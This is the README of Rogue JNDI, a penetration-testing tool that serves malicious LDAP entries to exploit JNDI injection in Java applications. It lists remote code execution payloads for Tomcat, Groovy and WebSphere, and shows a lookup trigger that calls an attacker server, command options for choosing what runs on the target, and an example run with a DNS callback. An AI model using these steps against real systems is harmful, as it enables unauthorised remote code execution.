## Rogue JNDI
A malicious LDAP server for JNDI injection attacks.

### Description
The project contains LDAP & HTTP servers for exploiting insecure-by-default Java JNDI API.<br> 
In order to perform an attack, you can start these servers locally and then trigger a JNDI resolution on the vulnerable client, e.g.:
```java
InitialContext.doLookup("ldap://your_server.com:1389/o=reference");
```
It will initiate a connection from the vulnerable client to the local LDAP server.
Then, the local server responds with a malicious entry containing one of the payloads, that can be useful to achieve a Remote Code Execution. 

### Motivation
In addition to the known JNDI attack methods(via remote classloading in references), this tool brings new attack vectors by leveraging the power of [ObjectFactories](https://docs.oracle.com/javase/8/docs/api/javax/naming/spi/ObjectFactory.html).

### Supported payloads
* [RemoteReference.java](/src/main/java/artsploit/controllers/RemoteReference.java) - classic JNDI attack, leads to RCE via remote classloading, works up to jdk8u191 
* [Tomcat.java](/src/main/java/artsploit/controllers/Tomcat.java) - leads to RCE via unsafe reflection in **org.apache.naming.factory.BeanFactory** 
* [Groovy.java](/src/main/java/artsploit/controllers/Groovy.java) - leads to RCE via unsafe reflection in **org.apache.naming.factory.BeanFactory** + **groovy.lang.GroovyShell**
* [WebSphere1.java](/src/main/java/artsploit/controllers/WebSphere1.java) - leads to OOB XXE in **com.ibm.ws.webservices.engine.client.ServiceFactory**
* [WebSphere2.java](/src/main/java/artsploit/controllers/WebSphere2.java) - leads to RCE via classpath manipulation in **com.ibm.ws.client.applicationclient.ClientJ2CCFFactory**

### Usage
```
$ java -jar target/RogueJndi-1.0.jar -h
+-+-+-+-+-+-+-+-+-+
|R|o|g|u|e|J|n|d|i|
+-+-+-+-+-+-+-+-+-+
Usage: java -jar target/RogueJndi-1.0.jar [options]
  Options:
    -c, --command  Command to execute on the target server (default: 
                   /Applications/Calculator.app/Contents/MacOS/Calculator) 
    -n, --hostname Local HTTP server hostname (required for remote 
                   classloading and websphere payloads) (default: 
                   192.168.1.10) 
    -l, --ldapPort Ldap bind port (default: 1389)
    -p, --httpPort Http bind port (default: 8000)
    --wsdl         [websphere1 payload option] WSDL file with XXE payload 
                   (default: /list.wsdl)
    --localjar     [websphere2 payload option] Local jar file to load (this 
                   file should be located on the remote server) (default: 
                   ../../../../../tmp/jar_cache7808167489549525095.tmp) 
    -h, --help     Show this help
```
The most important parameters are the ldap server hostname (-n, should be accessible from the target) and the command you want to execute on the target server (-c).
 
As an alternative to the "-c" option, you can modify the [ExportObject.java](/src/main/java/artsploit/ExportObject.java) file by putting java code you want to execute on the target server. 

### Example:
```
$ java -jar target/RogueJndi-1.1.jar --command "nslookup your_dns_sever.com" --hostname "192.168.1.10"
+-+-+-+-+-+-+-+-+-+
|R|o|g|u|e|J|n|d|i|
+-+-+-+-+-+-+-+-+-+
Starting HTTP server on 0.0.0.0:8000
Starting LDAP server on 0.0.0.0:1389
Mapping ldap://192.168.1.10:1389/ to artsploit.controllers.RemoteReference
Mapping ldap://192.168.1.10:1389/o=reference to artsploit.controllers.RemoteReference
Mapping ldap://192.168.1.10:1389/o=tomcat to artsploit.controllers.Tomcat
Mapping ldap://192.168.1.10:1389/o=groovy to artsploit.controllers.Groovy
Mapping ldap://192.168.1.10:1389/o=websphere1 to artsploit.controllers.WebSphere1
Mapping ldap://192.168.1.10:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1
Mapping ldap://192.168.1.10:1389/o=websphere2 to artsploit.controllers.WebSphere2
Mapping ldap://192.168.1.10:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2
Mapping ldap://192.168.1.10:1389/o=dbcp2h2 to artsploit.controllers.Dbcp2H2
Mapping ldap://192.168.1.10:1389/o=tomcat-user-database to artsploit.controllers.TomcatMemoryUserDatabase
Mapping ldap://192.168.1.10:1389/o=hikaricph2 to artsploit.controllers.HikariCPH2
Mapping ldap://192.168.1.10:1389/o=druidh2 to artsploit.controllers.DruidH2
Mapping ldap://192.168.1.10:1389/o=hikaricp-h2-local-factory to artsploit.controllers.HikariCPH2LocalFactory
```

### Building
Java v1.7+ and Maven v3+ required
```
mvn package
```

### Disclamer
This software is provided solely for educational purposes and/or for testing systems which the user has prior permission to attack.

### Special Thanks
* [Alvaro Muñoz](https://twitter.com/pwntester) and [Oleksandr Mirosh](https://twitter.com/olekmirosh) for the excellent [whitepaper](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf) on JNDI attacks
* [@zerothoughts](https://github.com/zerothoughts) for the inspirational [spring-jndi](https://github.com/zerothoughts/spring-jndi) repository
* [Moritz Bechler](https://github.com/zerothoughts) for the eminent [marshallsec](https://github.com/mbechler/marshalsec) research
* [Orange Tsai](https://twitter.com/orange_8361) and [Welk1n](https://github.com/welk1n) for the Apache + Groovy gadget

### Links
* An article about [Exploiting JNDI Injections in Java](https://www.veracode.com/blog/research/exploiting-jndi-injections-java) in the Veracode Blog
* [How I Hacked Facebook Again! Unauthenticated RCE on MobileIron MDM](https://blog.orange.tw/2020/09/how-i-hacked-facebook-again-mobileiron-mdm-rce.html) 

### Authors
[Michael Stepankin](https://twitter.com/artsploit)
